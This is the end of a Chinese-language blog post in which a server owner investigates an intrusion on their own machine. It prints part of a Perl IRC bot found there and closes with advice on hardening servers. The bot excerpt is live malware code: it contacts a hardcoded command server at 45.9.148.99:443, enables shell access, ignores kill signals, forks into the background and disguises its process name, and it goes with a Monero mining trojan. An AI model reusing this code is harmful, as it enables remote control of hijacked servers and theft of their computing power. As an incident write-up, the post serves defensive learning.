+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$servidor&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#39;45.9.148.99&amp;#39;&lt;/span> &lt;span class="k">unless&lt;/span> &lt;span class="nv">$servidor&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">$porta&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#39;443&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">@canais&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;#007&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">@adms&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;polly&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;molly&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">@auth&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">$linas_max&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">$sleep&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">$nick&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">getnick&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">$ircname&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">getnick&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">$realname&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="sb">`uname -a`&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">$acessoshell&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">$prefixo&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;! &amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">$estatisticas&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">$pacotes&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">$VERSAO&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#39;0.2a&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$SIG&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s">&amp;#39;INT&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#39;IGNORE&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$SIG&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s">&amp;#39;HUP&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#39;IGNORE&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$SIG&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s">&amp;#39;TERM&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#39;IGNORE&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$SIG&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s">&amp;#39;CHLD&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#39;IGNORE&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$SIG&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s">&amp;#39;PS&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#39;IGNORE&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">use&lt;/span> &lt;span class="nn">IO::Socket&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">use&lt;/span> &lt;span class="nn">Socket&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">use&lt;/span> &lt;span class="nn">IO::Select&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">chdir&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$servidor&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;$ARGV[0]&amp;#34;&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="nv">$ARGV&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$0&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;$processo&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s">&amp;#34;\0&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">$pid&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nb">fork&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">exit&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="nv">$pid&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">die&lt;/span> &lt;span class="s">&amp;#34;Problema com o fork: $!&amp;#34;&lt;/span> &lt;span class="k">unless&lt;/span> &lt;span class="nb">defined&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$pid&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">%irc_servers&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">%DCC&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">my&lt;/span> &lt;span class="nv">$dcc_sel&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nn">IO::Select&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="k">new&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">sub&lt;/span> &lt;span class="nf">getnick&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;x&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">rand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">9000&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">rand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">9000&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">sub&lt;/span> &lt;span class="nf">getident&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">my&lt;/span> &lt;span class="nv">$retornoident&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">_get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;http://www.minpop.com/sk12pack/idents.php&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">my&lt;/span> &lt;span class="nv">$identchance&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">rand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">99000&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$identchance&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">30&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nv">$nick&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nv">$retornoident&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nv">$retornoident&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">sub&lt;/span> &lt;span class="nf">getname&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">my&lt;/span> &lt;span class="nv">$retornoname&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">_get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;http://www.minpop.com/sk12pack/names.php&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nv">$retornoname&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">sub&lt;/span> &lt;span class="nf">getident2&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">my&lt;/span> &lt;span class="nv">$length&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nb">shift&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$length&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">3&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$length&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">my&lt;/span> &lt;span class="nv">@chars&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="o">..&lt;/span>&lt;span class="s">&amp;#39;z&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#39;A&amp;#39;&lt;/span>&lt;span class="o">..&lt;/span>&lt;span class="s">&amp;#39;Z&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#39;1&amp;#39;&lt;/span>&lt;span class="o">..&lt;/span>&lt;span class="s">&amp;#39;9&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">foreach&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">..&lt;/span>&lt;span class="nv">$length&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$randomstring&lt;/span>&lt;span class="o">.=&lt;/span>&lt;span class="nv">$chars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">rand&lt;/span> &lt;span class="nv">@chars&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nv">$randomstring&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">......&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>其中有一个很明显的 ip 地址 &lt;code>45.9.148.99&lt;/code> 通过 &lt;code>IP&lt;/code> 地址定位，发现是在荷兰，臭名昭著~&lt;/p>
+&lt;p>&lt;img src="https://example.com/../../post/%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%97%85%e6%af%92/Snipaste_2022-03-07_12-41-06.png"
+loading="lazy"
+alt="Alt"
+>&lt;/p>
+&lt;p>还有一个主文件 &lt;code>kwsapd0&lt;/code> 但是是经过特殊加密的，暂时不会解码的手段，不过根据网上的查询多半是 &lt;code>XMRig&lt;/code> 编译的 &lt;code>Linux&lt;/code> 平台&lt;strong>门罗币&lt;/strong>挖矿木马了。&lt;/p>
+&lt;p>这次的木马调查也只能到此结束了，后面深入的事情也不是我有能力去做的了，只是很讨厌这种行为，通过木马挖矿就是小偷行为，偷别人的算力，非常可耻！&lt;/p>
+&lt;h2 id="总结">总结&lt;/h2>
+&lt;p>自己的服务器要小心，不要被别人拿去白打工了，密码最好复杂一点，各个用户的都要复杂一点，因为不是 &lt;code>sudo&lt;/code>用户也有可能被入侵，密码最好定期跟换，对于端口开放要谨慎，要限制访问 &lt;code>IP&lt;/code>。&lt;/p>
+&lt;p>这次的木马时间算是给了我一个教训吧，辛亏服务器内数据不多，损失也不算大，但是以后还是要多加小心。&lt;/p></description></item></channel></rss>
